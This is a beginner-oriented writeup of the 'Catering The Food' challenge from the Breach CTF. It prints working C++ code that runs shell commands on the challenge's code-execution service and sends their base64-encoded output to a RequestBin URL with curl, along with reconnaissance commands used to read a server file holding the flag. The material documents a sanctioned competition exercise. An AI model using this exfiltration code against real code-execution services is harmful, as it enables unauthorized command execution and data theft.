---
title: "Catering The Food"
date: 2025-04-10 12:29:58 +0200
categories: writeups ctf
tags: ctf rce requestbin
description: Writeup of the Catering The Food challenge from the Breach CTF.
image: ../assets/images/posts/logos/breach-ctf.png
---
## Introduction

**Author**: Álvaro Bernal (aka. **trr0r**)

This writeup walks through the challenge **Catering The Food** from the [Breach CTF](https://ctf.breachers.in/). It is intended for **beginners** and includes detailed descriptions of each step, along with commentary for every screenshot. I believe the proposed solution is not the intended path for the challenge, but exploring alternative exploitation techniques is **valuable**, as it broadens our understanding and reveals a range of **potential attack vectors**.

___
### Request Bin

First, we need to go to [Requestbin](https://requestbin.whapi.cloud/) and create a **public URL** where we will be receiving the **output** of the commands we execute.

![](<../assets/images/posts/2025-04-10-cateringthefood/Pasted image 20250406202922.png>)

By clicking on `Create a RequestBin`, a public URL endpoint is generated. We’ll copy this URL to the clipboard, since it will be required in subsequent steps.

![](<../assets/images/posts/2025-04-10-cateringthefood/Pasted image 20250406203025.png>)
### Receiving `curl` command

The code snippet demonstrates using the `system()` function in C++ to run a `curl` command:

```cpp
#include <iostream>
#include <iostream>
#include <cstdlib>  // To use system()

// Author: Álvaro Bernal (aka. trr0r)

int main() {
    // Declare curl command
    const char* command = "curl http://<your-request-bin-url>/testingifcurlworks";
    
    // Make a system call to execute curl command
    int result = system(command);
    return 0;
}
```

The previously written code will be pasted into the website, which provides an environment for executing C++ code directly.

![](<../assets/images/posts/2025-04-10-cateringthefood/Pasted image 20250406203526.png>)

Shortly after, a GET request will be triggered and received at the previously created RequestBin endpoint (public URL).

![](<../assets/images/posts/2025-04-10-cateringthefood/Pasted image 20250406203348.png>)
### Getting comands output

This stage of the challenge becomes more **complex**. Previously, it was enough to confirm that the target system was susceptible to **remote command execution**. Now, however, we need to ensure we can execute **arbitrary commands reliably**. To facilitate this and minimize potential errors, we’ll implement two helper functions that will **streamline** the command injection process and improve flexibility:

- `base64_encode`: Encodes command output to Base64.
- `url_escape`: Escapes characters to make the data safe for URLs.

In summary, the code that we will need to input into the webpage to **execute arbitrary commands seamlessly**, without any complications, is as follows:

```cpp
#include <iostream>
#include <cstdio>
#include <cstdlib>
#include <string>

// Author: Álvaro Bernal (aka. trr0r)

// Function to manually encode a string in Base64
std::string base64_encode(const std::string& input) {
    const std::string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string encoded;
    int val = 0, valb = -6;
    for (unsigned char c : input) {
        val = (val << 8) + c;
        valb += 8;
        while (valb >= 0) {
            encoded.push_back(base64_chars[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    if (valb > -6) encoded.push_back(base64_chars[((val << 8) >> (valb + 8)) & 0x3F]);
    while (encoded.size() % 4) encoded.push_back('=');
    return encoded;
}

// Function to escape special characters for URL encoding
std::string url_escape(const std::string& str) {
    std::string escaped;
    for (char c : str) {
        if (c == ' ') escaped += "+";  // Replace space with "+"
        else if (c == '&') escaped += "%26";  // Escape "&"
        else if (c == '?') escaped += "%3F";  // Escape "?"
        else if (c == '=') escaped += "%3D";  // Escape "="
        else if (c == '%') escaped += "%25";  // Escape "%"
        else if (c == '/') escaped += "%2F";  // Escape "/"
        else if (c == '#') escaped += "%23";  // Escape "#"
        else escaped += c;  // Add characters as-is if they are not special
    }
    return escaped;
}

int main() {
    FILE* fp = popen("whoami", "r");  // Execute "whoami" command - Modifiy as your needs
    if (fp == nullptr) return 1;  // Exit if command execution fails

    char buffer[512];
    std::string output;
    while (fgets(buffer, sizeof(buffer), fp)) {
        output += buffer;  // Add each line of the output to the string
    }
    fclose(fp);  // Close the file pointer

    if (!output.empty() && output[output.size() - 1] == '\n') output.pop_back();  // Remove newline character at the end

    std::string encoded_output = base64_encode(output);  // Encode the output in Base64
    std::string escaped_output = url_escape(encoded_output);  // Escape the Base64 encoded output for URL

    // Prepare the curl command with the Base64 encoded and URL escaped output
    std::string curl_command = "curl \"http://<your-request-bin-url>/?output=" + escaped_output + "\"";
    system(curl_command.c_str());  // Execute the curl command

    return 0;
}
```
### Receiving comands output

The procedure executed by the C++ script is outlined below.
1. Run `whoami`
2. Encode in Base64
3. Escape for URL
4. Send with `curl`.

Upon completion, we will see a **base64-encoded** string being received at our RequestBin endpoint.

![](<../assets/images/posts/2025-04-10-cateringthefood/Pasted image 20250406210403.png>)

___
### Getting the flag

By decoding the **base64-encoded** content, we will uncover the **username** under which the remote commands are being executed.

![](<../assets/images/posts/2025-04-10-cateringthefood/Pasted image 20250406210349.png>)

Next, we will modify the previously shared code slightly to execute the following command, which will enable us to **list all directories and files from the system's root**.

```bash
ls -la
```

By repeating the same process as before (decoding the base64-encoded string received at the RequestBin), we will obtain the **directory structure**.

![](<../assets/images/posts/2025-04-10-cateringthefood/Pasted image 20250406210445.png>)

Next, we will make another modification to the code, this time to display the contents within the **app directory**.

```bash
ls -la /app/
```

Upon inspection, we will observe a directory (**/static**) and a file (**WEB_API.py**), the latter of which will stand out since it is responsible for serving the website.

![](<../assets/images/posts/2025-04-10-cateringthefood/Pasted image 20250406210558.png>)

If we try to access the content of the file, we will observe that **no request** is made to our RequestBin endpoint.

```bash
cat /app/WEB_API.py
```

This problem may occur because the file's content is **too large**, causing the URL to become **too long**, which prevents it from being sent due to the character limit. As an alternative, we will run the following command to display the **first 20 lines of the file**.

```bash
head -n 20 /app/WEB_API.py
```

At this point, we will notice that we receive a request (which is quite long). After decoding its content, we will discover that we have successfully accessed **the flag**, completing the challenge in a fully **valid alternative way**.

![](<../assets/images/posts/2025-04-10-cateringthefood/Pasted image 20250406210752.png>)

___
## Final Notes

This challenge tested basic concepts in **RCE**, exfiltration techniques via **HTTP requests**, and basic reconnaissance within a containerized environment. For **beginners**, it's a great introduction to chaining small steps into a successful exploit path.